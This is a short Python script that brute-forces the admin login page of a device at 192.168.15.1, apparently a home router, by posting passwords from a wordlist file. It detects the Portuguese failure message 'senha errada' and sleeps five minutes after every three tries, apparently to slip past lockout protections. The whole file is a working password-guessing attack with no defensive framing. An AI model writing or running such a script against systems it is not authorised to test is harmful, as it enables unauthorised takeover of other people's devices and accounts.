import requests
from time import sleep

url = 'http://192.168.15.1/login.html'
passwords_file = open('possible_passwords.txt')
passwords = passwords_file.readlines()

count = 0

for password in passwords:
    if count < 3:

        data = {'user' : 'admin',
                 'pass' : password}

        response = requests.post(url, data=data)

        if "senha errada" in response.text:
            print (f'Wrong password: {password}')

        else:
            print (f'Correct password: {password}')

        count += 1
    else:
        count = 0
        sleep(300)

